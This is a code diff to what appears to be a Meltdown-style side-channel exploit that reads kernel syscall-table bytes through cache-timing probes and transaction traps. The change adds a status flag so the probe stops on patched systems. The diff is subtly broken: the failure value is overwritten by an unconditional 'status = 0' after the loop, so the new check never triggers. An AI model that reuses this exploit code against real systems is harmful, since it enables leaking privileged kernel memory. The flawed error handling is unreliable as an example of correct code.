@@ -101,7 +101,7 @@ static inline void setup_transaction_trap_mitigation() {
 //
 // Retrieves one byte from syscall table at address target_address.
 //
-static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, char* pages) {
+static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, char* pages, int& status) {
     std::array<unsigned long, total_pages> index_heat;
     index_heat.fill(0);
 
@@ -152,9 +152,11 @@ static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, ch
         // TODO: terrible workaround to prevent endless loop in patched systems and still make it work
         // for non patched systems; find a way to fix it!
         if (!incr && useless_iterations++ == max_useless_iterations) {
+            status = -1;
             break;
         }
     }
+    status = 0;
     // Returns the index which was more frequently chosen.
     return std::distance(index_heat.begin(), std::max_element(index_heat.begin(), index_heat.end()));
 }
@@ -188,7 +190,11 @@ static bool check_one_syscall_table_address(uintptr_t target_address, char* page
     unsigned char buffer[address_size];
 
     for (auto i = 0; i < address_size; i++) {
-        buffer[i] = probe_one_syscall_table_address_byte(target_address + i, pages);
+        int status = 0;
+        buffer[i] = probe_one_syscall_table_address_byte(target_address + i, pages, status);
+        if (status == -1) {
+            return false;
+        }
     }
     return validate_syscall_table_entry(buffer, symbol_map);
 }
